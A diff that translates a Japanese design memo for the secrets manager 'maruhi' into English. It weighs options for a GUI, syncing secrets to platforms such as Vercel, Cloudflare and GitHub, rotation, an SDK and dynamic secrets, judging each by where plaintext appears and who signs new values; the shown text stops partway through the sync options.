@@ -1,875 +1,876 @@
-# 統合面の設計案 — 同期先・上流ローテーション・SDK・動的シークレット(+ 値あり GUI)
+# Design options for the integration surfaces — sync destinations, upstream rotation, SDK, dynamic secrets (+ value-bearing GUI)
 
-Status: 2026-09-04 起草(検討メモ)。**同日の所有者裁定で ROADMAP へ反映済み**: 値あり GUI = やらない、同期先 = SY 系列として招待制ベータのゲート(SY1〜SY5 — H4〔法務〕より先。PaaS 第 2 陣と GitHub Actions secrets を含む)+ SY6〔= 本メモの案 S4・変更通知〕は需要駆動へ降格、同期は無料枠、Windows はゲート外、上流ローテーション / SDK / 動的シークレット / SSO = ROADMAP「需要駆動」節(動的シークレットのサーバー発行はやらないと決定)、Windows 実用対応 = Phase 2 CLI 配布項。§8 の申し送りのうち 1(S5 のホステッド可否 = 出さない)・6(値なし ui が先)は同裁定で解消、2〜5 は実装 PR 側で裁定。
-出発点は docs/notes/competitive-analysis.md §4 の劣後点。所有者の方針(2026-09-04): SSO / SCIM はエンタープライズ需要が出てから(価格表に問い合わせ限定の Enterprise 枠を置く)、SOC 2 は無視、同期先はやりたい、残りは案を並べて評価してから決める。
+Status: drafted 2026-09-04 (deliberation memo). **Reflected on the ROADMAP by a same-day owner ruling**: value-bearing GUI = not doing, sync destinations = filed as the SY series as an invite-only beta gate (SY1–SY5 — ahead of H4 [legal]. Includes the second PaaS wave and GitHub Actions secrets) + SY6 [= this memo's option S4, change notification] demoted to demand-driven, sync is in the free tier, Windows is outside the gate, upstream rotation / SDK / dynamic secrets / SSO = ROADMAP "demand-driven" section (server-side issuance of dynamic secrets is decided as not doing), practical Windows support = Phase 2 CLI distribution item. Of the §8 handoffs, 1 (whether S5 ships hosted = it does not) and 6 (the no-value ui comes first) were resolved by the same ruling; 2–5 are ruled on in the implementation PRs.
+The starting point is the trailing points in docs/notes/competitive-analysis.md §4. The owner's policy (2026-09-04): SSO / SCIM wait for enterprise demand (put an inquiry-only Enterprise slot on the pricing table), ignore SOC 2, do want sync destinations, decide the rest after lining up and evaluating options.
 
-書き方: 各テーマで「新しい案が出なくなるまで」列挙 → 分かりやすい言葉で評価 → 推奨。評価記号は ◎ 推奨 / ○ 条件付き / △ 保留 / × やらない。
+How this is written: for each theme, enumerate "until no new options emerge" → evaluate in plain language → recommend. Evaluation symbols: ◎ recommended / ○ conditional / △ on hold / × not doing.
 
 ---
 
-## 0. 結論(先に全体像)
+## 0. Conclusion (the whole picture first)
 
-| テーマ | 推奨 | 一言 |
+| Theme | Recommendation | In one line |
 |---|---|---|
-| 値あり GUI | **今はやらない** | 値なし `maruhi ui`(ADR-0018 第 2 段)を先に出し、需要を測る。値ありは no-reveal 方針(ADR-0014 決定 2 ④)と逆向き |
-| 同期先 | **やる。CLI 主導 + CI 自動化 + 変更通知** | 平文は各人の機械か CI ランナーにしか置かない。サーバーが復号して push する形(Phase の SSE 型)はセルフホスト限定の後続。GitHub Actions secrets は sealed box 中継で「サーバーが読めない自動同期」が可能 |
-| 上流ローテーション | **最小でやる(CLI 実行・数コネクタ)** | 「要ローテーション検出」(済)+ `member remove` 後のチェックリスト + `maruhi var rotate <var>` の手動実行。定期自動化は「封印提案 + 人間の副署」で後続。サーバー駆動は × |
-| SDK | **TypeScript 1 本だけ、需要が出てから** | ランタイム SDK = 既存のワークロードリースのクライアント。Vercel OIDC が最初の対象。多言語の検証付き SDK は × 、平文を返す SDK はホステッドでは × |
-| 動的シークレット | **サーバー発行はやらない** | 「クラウド側のフェデレーション(STS 等)を使い、maruhi は残りの静的秘密を持つ」を公式の立場にする。クライアント側の短命資格(`proxy run` での GitHub App トークン等)は Phase 3 の延長で ○ |
+| Value-bearing GUI | **Not now** | Ship the no-value `maruhi ui` (ADR-0018 stage 2) first and measure demand. A value-bearing one runs against the no-reveal policy (ADR-0014 decision 2 ④) |
+| Sync destinations | **Yes. CLI-led + CI automation + change notification** | Plaintext lives only on each person's machine or a CI runner. The form where the server decrypts and pushes (Phase's SSE style) is a self-hosted-only follow-up. GitHub Actions secrets allow "automated sync the server cannot read" via sealed-box relay |
+| Upstream rotation | **Do the minimum (CLI-executed, a few connectors)** | "needs-rotation detection" (done) + a post-`member remove` checklist + manual `maruhi var rotate <var>`. Scheduled automation follows as "sealed proposal + human countersign". Server-driven is × |
+| SDK | **One TypeScript SDK only, once demand appears** | Runtime SDK = a client for the existing workload lease. Vercel OIDC is the first target. A multi-language verified SDK is ×; an SDK that returns plaintext is × for hosted |
+| Dynamic secrets | **No server-side issuance** | Make "use cloud-side federation (STS etc.); maruhi holds the remaining static secrets" the official position. Client-side short-lived credentials (GitHub App tokens via `proxy run`, etc.) are ○ as a Phase 3 extension |
 
-横断で見つかった共通部品(§7): ① **変更通知 webhook(メタデータのみ)**、② **コネクタ(プロバイダ)プラグインの枠**(ローテーションと動的で共用)、③ **封印提案(sealed proposal)** = 署名鍵を持たない自動処理が「新しい値の候補」をメンバー公開鍵宛に封印して置き、人間が副署して確定する形。この 3 つがあれば **機械メンバー(サービスアカウント)を導入せずに済む**。「署名するのは人間だけ」を保てる。
-
----
-
-## 1. 判断軸(全テーマ共通)
-
-maruhi の値は「チェーン上のメンバーの署名」が必須で、サーバーは enc 鍵しか持たず署名できない(CRYPTO_SPEC §9 / §14.2-2)。よって案はすべて次の 2 問で分類できる。
-
-1. **平文はどこに現れるか** — 各人の機械 / CI ランナー / ユーザー所有の別プロセス / maruhi サーバー / 同期先。同期先に平文が置かれるのは定義上避けられない(それが同期)。問題は「そこへ運ぶ途中で誰が見るか」
-2. **新しい値を誰が署名するか** — 人間の CLI か、それ以外か。「それ以外」が要る案は仕様改訂(署名鍵の付与)を伴う
-
-補助の軸: 自動化(値が変わったら勝手に追随するか)/ 実装コスト(個人開発で持ち切れるか)/ ADR との整合(0002・0014・0018)。
-
-前提として重要な事実: **CI リース(`maruhi ci run`)は `grant_server` 済みプロジェクトが前提**なので、リースを使う時点でサーバーはその環境の DEK を(自分宛ラップとして)持っている。リース経路でサーバーが値を復号しないのは「しない」であって「できない」ではない。以下で「サーバーは平文を持たない」と書く場合、grant なしの案は「できない」、grant ありの案は「しない(コードで確認できる)」の意味である。
+Cross-cutting shared components found (§7): ① **change-notification webhook (metadata only)**, ② **a connector (provider) plugin framework** (shared by rotation and dynamic), ③ **sealed proposal** = an automated process without a signing key seals a "candidate new value" to the members' public keys and a human countersigns to finalize it. With these three, **no machine member (service account) is needed**. "Only humans sign" is preserved.
 
 ---
 
-## 2. 値あり GUI — 何か、入れる価値はあるか
+## 1. Decision axes (common to all themes)
 
-### 何か
+A maruhi value requires "a signature by an on-chain member"; the server holds only the enc key and cannot sign (CRYPTO_SPEC §9 / §14.2-2). So every option can be classified by two questions:
 
-ADR-0018 の 3 段のうち第 3 段。値を表示・編集できる画面のこと。**ホステッドの Web ではない**(Web は復号器を持たないことが決定済み)。候補の形は 2 つ:
+1. **Where does plaintext appear** — each person's machine / a CI runner / a user-owned separate process / the maruhi server / the sync destination. Plaintext at the sync destination is unavoidable by definition (that is what sync is). The question is "who sees it on the way there"
+2. **Who signs a new value** — a human's CLI, or something else. Options that need "something else" come with a spec revision (granting a signing key)
 
-- **`maruhi ui`(値あり)**: CLI が 127.0.0.1 に画面を出し、ブラウザで開く。復号は CLI プロセス、ブラウザは表示のみ。問題は「ブラウザ拡張が DOM の値を読める」と「localhost の TCP 口が値 API になる」の 2 点
-- **署名済みデスクトップアプリ(Tauri + CLI sidecar)**: 拡張が入らず TCP 口も不要。ADR-0018 改訂 1 の本命だが、Rust ツールチェーン・WebView の供給網・updater 署名鍵という本リポ最大級の依存追加になる
+Auxiliary axes: automation (does it follow value changes on its own) / implementation cost (can a solo developer carry it) / consistency with the ADRs (0002, 0014, 0018).
 
-競合 5 社はすべて Web で値を見せる。つまり「ダッシュボードで値を見る」は市場の既定の期待である。
-
-### 入れる価値
-
-**現時点では低い**と評価する。理由:
-
-- **方向が逆**: ADR-0014 決定 2 ④ は「人間向けの値表示を例外操作に格上げする(no-reveal 方針化)」。値ありの GUI は「値を見る」を日常操作に戻す
-- **需要が未検証**: ADR-0018 Rationale (3) のとおり。ドッグフーディングと招待制ベータで「画面で値を見たい」が実際に何回出るかを数えてから決めればよい
-- **本当に必要な人が誰か不明**: 開発者は `maruhi run` で値を見る必要がない。値を「見たい」のは (a) 非開発者のメンバー(PM がテスト用キーを取り出す等)、(b) 移行時に一覧確認したい人、(c) デバッグで 1 個だけ確認したい人。(c) は `pull --show` で足りる。(a) は「その人に値を渡す運用自体を減らす」のが maruhi の思想。(b) は値なし `maruhi ui` の一覧 + `pull --show` で足りる
-- **TCB が増える**: 値ありは配布物の攻撃面を確実に増やす(ADR-0018 改訂 1 の署名オラクル問題・拡張混入)。得られるのが「便利」だけなら割に合わない
-
-**入れる価値が出る条件**(再訪の契機として記録):
-
-1. 招待制ベータで「値を画面で見たい / 編集したい」が主要な離脱理由として繰り返し観測される
-2. 値なし `maruhi ui`(第 2 段)が実装済みで、UI と鍵保持プロセスの操作別契約(ADR-0018 改訂 1)が固まっている
-3. macOS 公証などデスクトップ署名のインフラが揃っている(Tauri 案の前提)
-
-順序として、**値なし `maruhi ui` を先に出す**のが正しい。招待受諾・指紋表示への導線・監査・ローテーション警告・メンバー一覧は値なしで全部できる。ここまでで「画面が欲しい」需要の大半は満たせる見込みで、残った需要が値ありの根拠になる。
+An important underlying fact: **the CI lease (`maruhi ci run`) presupposes a `grant_server`-ed project**, so once a lease is used the server already holds that environment's DEK (wrapped to itself). That the server does not decrypt values on the lease path is "does not", not "cannot". Below, "the server holds no plaintext" means "cannot" for grant-less options and "does not (verifiable in code)" for granted ones.
 
 ---
 
-## 3. 同期先(Vercel / Cloudflare / Netlify / AWS SM / GCP SM / K8s …)
+## 2. Value-bearing GUI — what it is, and whether it is worth doing
 
-> **番号の注意**: 本節の案番号 S1〜S13 はメモ内の通し番号で、ROADMAP の S 系列(値なしスキーマ)とも SY 系列とも別物。対応は ROADMAP の SY 系列ヘッダに記載(SY1 = S1、SY2 = S2 + S8、SY3 = S3、SY4 / SY5 = S2 のプリセット追加、**SY6 = S4 変更通知**)。
+### What it is
 
-### 同期の最終形(2026-09-05 — 7 ラウンドの収束点。ROADMAP SY 系列の正)
+Stage 3 of the three stages in ADR-0018: a screen that can display and edit values. **Not the hosted Web** (it is already decided that the Web holds no decryptor). Two candidate forms:
 
-**原則**: 同期先に平文が置かれるのは定義上避けられない。設計で決めるのは「誰が運ぶか」「途中で誰が見るか」「変更に追随するか」の 3 点で、答えは **「人間の CLI か CI が運び、サーバーは何も持たず、変更の瞬間に必ずいる書き手が起点になる」**。
+- **`maruhi ui` (value-bearing)**: the CLI serves a screen on 127.0.0.1 and opens it in a browser. Decryption happens in the CLI process; the browser only displays. The two problems: "browser extensions can read values in the DOM" and "the TCP port on localhost becomes a value API"
+- **A signed desktop app (Tauri + CLI sidecar)**: no extensions, no TCP port needed. It is the leading option in ADR-0018 revision 1, but it is the repo's largest-ever dependency addition: a Rust toolchain, the WebView supply chain, and an updater signing key
 
-| 層 | 決定 |
+All five competitors show values on the Web. In other words, "viewing values on a dashboard" is the market's default expectation.
+
+### Whether it is worth doing
+
+Rated **low at this point**. Reasons:
+
+- **It points the other way**: ADR-0014 decision 2 ④ "promotes human-facing value display into an exceptional operation (the no-reveal policy)". A value-bearing GUI turns "viewing a value" back into a routine operation
+- **Demand is unverified**: per ADR-0018 Rationale (3). Count how many times "I want to see values on a screen" actually comes up in dogfooding and the invite-only beta, then decide
+- **Unclear who truly needs it**: developers do not need to see values — `maruhi run` suffices. The people who "want to see" a value are (a) non-developer members (a PM pulling out a test key), (b) someone who wants a list review during migration, (c) someone who wants to check a single value while debugging. (c) is covered by `pull --show`. (a) goes against maruhi's philosophy of reducing the very practice of handing values to people. (b) is covered by the no-value `maruhi ui` list + `pull --show`
+- **The TCB grows**: value-bearing reliably expands the artifact's attack surface (the signing-oracle problem and extension injection from ADR-0018 revision 1). If all it buys is "convenience", it is not worth it
+
+**Conditions under which it becomes worth doing** (recorded as triggers to revisit):
+
+1. "I want to see / edit values on a screen" repeatedly observed as a leading churn reason in the invite-only beta
+2. The no-value `maruhi ui` (stage 2) is implemented and the per-operation contract between the UI and the key-holding process (ADR-0018 revision 1) has settled
+3. Desktop-signing infrastructure such as macOS notarization is in place (the Tauri option's prerequisite)
+
+Ordering-wise, **shipping the no-value `maruhi ui` first** is correct. Invite acceptance, a path to fingerprint display, audit, rotation warnings, and the member list all work without values. That should satisfy most of the "I want a screen" demand, and what remains becomes the evidence for a value-bearing one.
+
+---
+
+## 3. Sync destinations (Vercel / Cloudflare / Netlify / AWS SM / GCP SM / K8s …)
+
+> **Numbering note**: the option numbers S1–S13 in this section are serial within this memo and are distinct from both the ROADMAP's S series (no-value schema) and the SY series. The mapping is recorded in the ROADMAP's SY series headers (SY1 = S1, SY2 = S2 + S8, SY3 = S3, SY4 / SY5 = preset additions to S2, **SY6 = S4 change notification**).
+
+### The final form of sync (2026-09-05 — convergence point after 7 rounds. The source of truth for the ROADMAP SY series)
+
+**Principle**: plaintext at the sync destination is unavoidable by definition. What the design decides is "who carries it", "who sees it on the way", and "whether it follows changes" — and the answer is **"the human's CLI or CI carries it, the server holds nothing, and the writer — who is necessarily present at the moment of change — is the trigger"**.
+
+| Layer | Decision |
 |---|---|
-| 運ぶ主体 | 値を変えられるのは人間だけ → **変更の瞬間には書き手の CLI がいる**。書き手の CLI が直接同期する(push 時同期)か、`gh workflow run` で CI を起動する。サーバーの変更通知(webhook)は不要(需要駆動へ降格) |
-| 2 つの家族 | ① **CI がデプロイを握る対象**(Cloudflare Workers / Fly / Railway / AWS / GCP)= デプロイ時再適用(デプロイ workflow 内で毎回 maruhi から作り直す。ドリフトが構造的に消える)。② **Git 連携で相手がデプロイする対象**(Vercel)= push 時同期 + `schedule` の定期突合 |
-| ドライバ | 1 インターフェース × 2 種類。**手元 = `exec` を先に使う**(導入済み・ログイン済みのベンダー CLI〔`vercel` / `wrangler` / `gh`〕を stdin で駆動 — トークン作成が不要。`npx` で取りに行かない・テレメトリ off・ログ抑止)。**CI と未導入時 = `http`**(第一級 = Vercel / Cloudflare Workers。maruhi 自身のコード・一括 upsert・型付きエラー。トークンは maruhi の変数)。Netlify は第 2 波(http — **2026-09-08 SY4 第 1 波で実装済み**。exec は無い = 宣言の代わりに理由を置く)。プリセットは両種類とも宣言的(JSON + モック応答) — 補足 16 |
-| 設定の置き場 | 同期先の対応付け(maruhi 環境 → 同期先 / project id / 環境)は**非機密の設定としてリポジトリにコミット**(既存のアンカーファイルと同じ扱い)。統合トークンは**任意の環境の普通の変数**(E2EE・メモリで取り出す)。資格を絞りたいチームは別プロジェクトに置く |
-| 同期レシート | 「どの先に、どの変数の version まで届いたか」。設定で指定した環境の変数として保存(E2EE + §4.1 の書き込み署名 = 改竄検出つき・仕様改訂なし)。値由来のダイジェストは使わない。**エポックローテーションは現在値を新 version にするため、`env rotate` の実行者がレシートを進める**。ローテーション工程 ④「行き渡らせる」の追跡器を兼ねる |
-| UX | `sync plan` / `sync apply`。production は既定で plan のみ(手動 apply)、preview / development は自動。複数 push はセッション末尾で 1 回同期。スキーマの `required` で同期先の完全性を検査 |
-| エージェント環境 | `run` と同じ扱い(専用ゲートなし)。値を stdout に出さない・監査行を残す。持ち出し防止は Phase 3 brokering の領分 |
-| GitHub secrets | `gh` を exec ドライバとして使う(手元・CI とも)。ネイティブ封印(依存追加)は不要。目標は「GitHub secrets を空にする」 |
-| 課金 | 無料枠(サーバーコストゼロ) |
-| 天井を上げる条件 | SDK + リース(コピーしない家族 — §5)、ユーザー所有の受信者(S7 — 仕様改訂)、同期先 API 側の OIDC / 公開鍵封印対応(maruhi の外) |
+| Carrier | Only humans can change a value → **the writer's CLI is present at the moment of change**. The writer's CLI syncs directly (sync-on-push) or starts CI via `gh workflow run`. A server-side change notification (webhook) is unnecessary (demoted to demand-driven) |
+| Two families | ① **Targets whose deploys CI controls** (Cloudflare Workers / Fly / Railway / AWS / GCP) = re-apply at deploy time (rebuild from maruhi inside the deploy workflow every time — drift disappears structurally). ② **Targets the vendor deploys via a Git integration** (Vercel) = sync-on-push + periodic `schedule` reconciliation |
+| Drivers | 1 interface × 2 kinds. **Local = use `exec` first** (drive an already-installed, already-logged-in vendor CLI [`vercel` / `wrangler` / `gh`] via stdin — no token creation needed. No fetching with `npx`, telemetry off, log suppression). **CI and not-yet-installed = `http`** (first-class = Vercel / Cloudflare Workers. maruhi's own code, batch upsert, typed errors. The token is a maruhi variable). Netlify is the second wave (http — **implemented in SY4 wave 1 on 2026-09-08**. No exec = put a reason where the declaration would be). Both kinds of preset are declarative (JSON + mock responses) — supplement 16 |
+| Where the config lives | The sync-destination mapping (maruhi environment → destination / project id / environment) is **committed to the repository as non-secret config** (same treatment as the existing anchor file). Integration tokens are **ordinary variables in any environment** (E2EE, fetched into memory). Teams that want to restrict credentials put them in a separate project |
+| Sync receipt | "Which destination has which variables at which version". Stored as a variable in the config-designated environment (E2EE + the §4.1 write signature = tamper-evident, no spec revision). No value-derived digests. **Epoch rotation turns current values into new versions, so the person who runs `env rotate` advances the receipt**. Doubles as the tracker for rotation step ④ "propagate" |
+| UX | `sync plan` / `sync apply`. Production is plan-only by default (manual apply); preview / development are automatic. Multiple pushes sync once at session end. Destination completeness is checked via the schema's `required` |
+| Agent environments | Same treatment as `run` (no dedicated gate). No values on stdout, audit lines kept. Exfiltration prevention is Phase 3 brokering's job |
+| GitHub secrets | Use `gh` as an exec driver (local and CI). Native sealing (a dependency addition) is unnecessary. The goal is "empty GitHub secrets" |
+| Billing | Free tier (zero server cost) |
+| Conditions that raise the ceiling | SDK + lease (the no-copy family — §5), a user-owned recipient (S7 — spec revision), sync-destination-side OIDC / public-key-seal support (outside maruhi) |
 
-### なぜ欲しいのか(問題の定義)
+### Why it is wanted (problem definition)
 
-同期が欲しい理由は 1 つ: **実行環境が自分のプロセス起動を握らせてくれない**。Vercel の Functions、Lambda、Cloudflare Workers、Netlify では `maruhi run -- <cmd>` を差し込めず、プラットフォーム自身の env ストアから値を読むしかない。よって同期 = 「プラットフォームのストアに平文を置く」であり、同期先に平文があること自体は避けられない。設計で決められるのは「誰がいつ運ぶか」「途中で誰が見るか」「変更に自動追随するか」の 3 点。
+There is one reason sync is wanted: **the runtime does not let us control process startup**. On Vercel Functions, Lambda, Cloudflare Workers, and Netlify you cannot inject `maruhi run -- <cmd>`; the only option is to read values from the platform's own env store. So sync = "put plaintext in the platform's store", and the presence of plaintext at the destination is itself unavoidable. What the design can decide is the three points "who carries it and when", "who sees it on the way", and "whether it follows changes automatically".
 
-### 案の列挙(新案が出なくなるまで)
+### Option enumeration (until no new options emerge)
 
-**案 S1. レシピのみ(実装なし)**
-`maruhi run -- sh -c 'printenv KEY | vercel env add KEY production'`、`maruhi run -- wrangler secret bulk`(stdin)など、既存コマンドの組み合わせを docs に書く。
-- 平文: 各人の機械のみ。自動化: なし。コスト: ほぼゼロ
-- 評価 **○(土台)**: 何を作るにせよ最初に置く。「同期機能がない」と言われないための最低線。Cloudflare 向けは `wrangler secret bulk` が stdin を読むので、レシピだけでかなり実用的
+**Option S1. Recipes only (no implementation)**
+Write combinations of existing commands in the docs: `maruhi run -- sh -c 'printenv KEY | vercel env add KEY production'`, `maruhi run -- wrangler secret bulk` (stdin), etc.
+- Plaintext: each person's machine only. Automation: none. Cost: near zero
+- Verdict **○ (foundation)**: whatever we build, this goes in first. The minimum for not hearing "there's no sync feature". For Cloudflare, `wrangler secret bulk` reads stdin, so a recipe alone is already quite practical
 
-**案 S2. `maruhi sync <target>`(CLI 主導・手動)**
-CLI が復号し、同期先の API を直接叩く。プリセット = Vercel / Cloudflare Workers / Netlify / AWS SM / GCP SM。同期先の API トークン自体を **maruhi の変数として保存**し(例: 環境 `_sync` や個人環境)、実行時にメモリで取り出す。ディスクレス不変条件を破らずに済む。
-- 平文: 各人の機械のみ。サーバーは grant 不要(**できない**側)。自動化: なし(人が打つ)。コスト: 小〜中(プリセットごとの API 差分)
-- 評価 **◎(第一歩)**: ゼロ知識を一切崩さない唯一の同期。「値を変えた人がその場で同期する」運用は小チームでは自然
+**Option S2. `maruhi sync <target>` (CLI-led, manual)**
+The CLI decrypts and calls the destination's API directly. Presets = Vercel / Cloudflare Workers / Netlify / AWS SM / GCP SM. The destination API token itself is **stored as a maruhi variable** (e.g. an `_sync` environment or a personal environment) and fetched into memory at run time — the diskless invariant stays intact.
+- Plaintext: each person's machine only. Server: no grant needed (the **cannot** side). Automation: none (a human runs it). Cost: small–medium (per-preset API differences)
+- Verdict **◎ (the first step)**: the only sync that does not bend zero-knowledge at all. "The person who changed a value syncs it on the spot" is a natural workflow for small teams
 
-**案 S3. CI から同期(S2 を `maruhi ci run` の中で実行)**
-GitHub Actions の workflow が `maruhi ci run -- maruhi sync vercel` を実行。既存の OIDC リース・リポジトリアンカー検証をそのまま使う。トリガーは `schedule` / `workflow_dispatch` / 後述の変更通知。
-- 平文: CI ランナー(既に `ci run` で信頼している場所)。サーバー: grant あり・復号は**しない**。自動化: あり。コスト: 小(S2 の上に workflow テンプレートを足すだけ)
-- 評価 **◎(自動化の第一形)**: 追加の信頼先を増やさずに自動化できる。GitHub Actions ユーザー(HP4)にはこれで十分
+**Option S3. Sync from CI (run S2 inside `maruhi ci run`)**
+A GitHub Actions workflow runs `maruhi ci run -- maruhi sync vercel`. Reuses the existing OIDC lease and repository-anchor verification as-is. Triggers: `schedule` / `workflow_dispatch` / the change notification below.
+- Plaintext: the CI runner (a place `ci run` already trusts). Server: granted but does **not** decrypt. Automation: yes. Cost: small (just a workflow template on top of S2)
+- Verdict **◎ (the first form of automation)**: automation without adding a new trust target. Enough for GitHub Actions users (HP4)
 
-**案 S4. 変更通知 webhook(メタデータのみ)**
-サーバーが「プロジェクト P の環境 E が更新された」だけを外部 URL(GitHub `repository_dispatch` 等)へ送る。値・名前は送らない。S3 のトリガーになり、「push したら数十秒で同期先に反映」が成立する。
-- 平文: なし(通知はメタデータ)。コスト: 小(DO の受理後フック + 送信先の設定 + 監査行)。注意: テレメトリゼロは「クライアント → 外部」の禁止であり、ユーザーが自分で設定した通知先への送信は該当しない(hosted-design §5-1 の線引きどおり)。ただし送信内容は静的な識別子に限定し、project_id(capability 相当 — AUTH_SPEC §11-2)を URL やボディに載せない設計にする
-- 評価 **◎(S3 と一体)**: 同期だけでなく、ローテーション・SDK のキャッシュ無効化にも使える共通部品(§7)
+**Option S4. Change-notification webhook (metadata only)**
+The server sends only "environment E of project P was updated" to an external URL (GitHub `repository_dispatch`, etc.). No values or names. Becomes S3's trigger and enables "push and the destination reflects it within tens of seconds".
+- Plaintext: none (the notification is metadata). Cost: small (a post-accept hook in the DO + destination config + an audit line). Note: zero telemetry prohibits "client → external" sends; a send to an endpoint the user configured themselves is not that (the hosted-design §5-1 line). The payload design still restricts itself to static identifiers and does not put project_id (capability-equivalent — AUTH_SPEC §11-2) in the URL or body
+- Verdict **◎ (integral to S3)**: a shared component usable beyond sync — rotation and SDK cache invalidation too (§7)
 
-**案 S5. サーバーが復号して push(Phase の SSE 型・Infisical / Doppler の標準形)**
-`grant_server` 済み環境について、サーバーが DEK で復号し同期先 API を叩く。同期先トークンはその環境の変数として保存(サーバーが読める)。
-- 平文: **maruhi サーバー**(一時的)。自動化: 完璧(受理即同期)。コスト: 中(DO からの外部 API 呼び出し・リトライ・エラー監査)。仕様: CRYPTO_SPEC §9 は grant 下の復号を既に許容。AUTH_SPEC に同期ジョブの受理面が要る
-- 評価 **○(セルフホスト限定で後続)/ ホステッドは △**: セルフホストなら「サーバー = 自分のアカウント」なので S5 は実質 S2 と同じ信頼。ホステッドで S5 を出すと運営が平文を扱う部品を持つことになり、「運営は読めない」の脚注がプロジェクト単位で付く(grant で既に付いているが、「持てる」から「扱う」に一段進む)。Phase と同じ位置に落ちるので差別化が薄れる。S3 + S4 で自動化が満たせるなら不要
+**Option S5. The server decrypts and pushes (Phase's SSE style; the Infisical / Doppler standard form)**
+For `grant_server`-ed environments, the server decrypts with the DEK and calls the destination API. The destination token is stored as a variable in that environment (readable by the server).
+- Plaintext: **the maruhi server** (transiently). Automation: perfect (sync on accept). Cost: medium (external API calls from the DO, retries, error audit). Spec: CRYPTO_SPEC §9 already permits decryption under grant; AUTH_SPEC needs an acceptance surface for sync jobs
+- Verdict **○ (self-hosted only, follow-up) / △ for hosted**: self-hosted, "the server = your own account", so S5 is effectively the same trust as S2. Shipping S5 hosted means the operator now runs a component that handles plaintext — the "the operator cannot read it" claim gains a per-project footnote (grant already adds one, but this goes a step further from "can hold" to "handles"). It lands in the same position as Phase, so differentiation thins. Unneeded if S3 + S4 satisfy automation
 
-**案 S6. 同期先の公開鍵へ封印して中継(sealed box 中継)**
-GitHub の Actions / Dependabot / Codespaces secrets API は、リポジトリ公開鍵への libsodium sealed box で暗号化した値しか受け付けない(平文は API を通らない)。つまり **クライアントが push 時に GitHub の公開鍵へ封印し、サーバーはその封印済みブロブを GitHub に転送するだけ**にできる。サーバーは平文を見られず、自動化は保たれる。
-- 平文: 各人の機械のみ(封印は書き手の CLI で行う)。サーバー: 中継のみ(grant 不要)。自動化: あり(push と同時に封印物が生まれる — **値が変わる瞬間には必ず書き手のクライアントがいる**のがこの案の要)。コスト: 中(同期先鍵の取得・鍵 ID の管理・封印物の保存と配送・鍵ローテ時の再封印)
-- 評価 **○(GitHub 限定の上位互換)**: 「サーバーが読めない自動同期」を実現できる唯一の形。ただし対応先は sealed box 方式の API を持つ GitHub のみ(Vercel / Netlify / AWS / GCP / Cloudflare は平文 API)。GitHub Actions は既にリースで「コピーしない」形を持っているので、S6 の用途は「`${{ secrets.X }}` を要求する既製アクション」「Dependabot / Codespaces」に限られる。需要が見えてから
+**Option S6. Seal to the destination's public key and relay (sealed-box relay)**
+GitHub's Actions / Dependabot / Codespaces secrets API only accepts values encrypted as a libsodium sealed box to the repository's public key (plaintext never crosses the API). So **the client seals to GitHub's public key at push time and the server merely forwards the sealed blob to GitHub**. The server never sees plaintext; automation is preserved.
+- Plaintext: each person's machine only (the writer's CLI does the sealing). Server: relay only (no grant needed). Automation: yes (the sealed object is born at push time — **there is always a writer client at the moment a value changes**, which is what makes this option work). Cost: medium (fetching destination keys, managing key IDs, storing and delivering sealed blobs, re-sealing on key rotation)
+- Verdict **○ (a GitHub-only superset)**: the only form that achieves "automated sync the server cannot read". But the only destination is GitHub, whose API takes sealed boxes (Vercel / Netlify / AWS / GCP / Cloudflare are plaintext APIs). Since GitHub Actions already has the "no copies" form via leases, S6's use is limited to "off-the-shelf actions that require `${{ secrets.X }}`" and "Dependabot / Codespaces". Wait for visible demand
 
-**案 S7. ユーザー所有の同期エージェント(「メンバー N+1」を運営でなくユーザーの資産にする)**
-ユーザーが自分の Cloudflare アカウントに小さな Worker(または任意の常駐プロセス)を立て、それを DEK の受信者として owner が署名で許可する。エージェントは S4 の通知を受けて pull → 復号 → 同期先へ push。
-- 平文: ユーザー所有のプロセス。運営: grant 不要(**できない**側)。自動化: あり。コスト: 大(受信者の一般化 = CRYPTO_SPEC §6.2 の `grant_server` を「非メンバー受信者鍵」へ一般化する仕様改訂、テンプレート Worker の配布、鍵の保管 = Workers Secret)
-- 評価 **△(ホステッドで S5 を拒む人向けの後続)**: 思想的には最も maruhi らしい(「信じなくてよい相手」に運営を含めたまま自動同期)。ただし S3 + S4 で GitHub Actions を使う人は満たせるため、対象は「GitHub Actions を使わない・かつ即時同期が要る・かつ運営に grant したくない」層に絞られる。需要が見えてから、仕様改訂として提示
+**Option S7. A user-owned sync agent (make "member N+1" a user asset, not the operator's)**
+The user runs a small Worker (or any resident process) in their own Cloudflare account, and the owner authorizes it by signature as a DEK recipient. The agent receives S4's notification, pulls, decrypts, and pushes to the destination.
+- Plaintext: a user-owned process. Operator: no grant needed (the **cannot** side). Automation: yes. Cost: large (a spec revision generalizing CRYPTO_SPEC §6.2 `grant_server` to "non-member recipient keys", distributing a template Worker, key custody = Workers Secret)
+- Verdict **△ (a follow-up for people who reject hosted S5)**: ideologically the most maruhi-like (automated sync while keeping the operator among "those you do not have to trust"). But S3 + S4 already covers GitHub Actions users, so the target narrows to "does not use GitHub Actions AND needs immediate sync AND does not want to grant the operator". Present it as a spec revision once demand is visible
 
-**案 S8. 汎用 HTTP アダプタ + プリセット(S2 の内部構造)**
-ベンダーごとに実装せず、「認証ヘッダ + エンドポイント + ボディのテンプレート」を宣言的に持つ汎用アダプタを 1 つ作り、Vercel / Netlify / … はプリセット(設定)として同梱する。ユーザーは未対応先も自分でプリセットを書ける。
-- 評価 **○(S2 の作り方として採用)**: 個人開発でコネクタの数を追わずに済む。実際の API は upsert の意味論・環境の対応付け・ページングに癖があるので「全部テンプレで済む」は言い過ぎだが、8 割はこれで持つ
+**Option S8. Generic HTTP adapter + presets (S2's internal structure)**
+Instead of implementing per vendor, build one generic adapter holding "auth header + endpoint + body template" declaratively, and ship Vercel / Netlify / … as presets (config). Users can write presets for unsupported destinations themselves.
+- Verdict **○ (adopted as how S2 is built)**: a solo developer does not have to chase connector counts. Real APIs have quirks in upsert semantics, environment mapping, and paging, so "everything is templates" overstates it — but this carries ~80%
 
-**案 S9. 同期でなく「取りに来させる」(プル側 = ランタイム SDK + OIDC リース)**
-Vercel(`VERCEL_OIDC_TOKEN`)、AWS、GCP、K8s、GitLab など workload identity を出せる環境では、アプリが起動時に maruhi からリースで DEK を受け取って復号すれば、**同期先に平文を置かなくて済む**。既存のリース設計は issuer 汎用(CRYPTO_SPEC §6.2 の lease_policy)なので、Vercel の OIDC もそのまま載る。
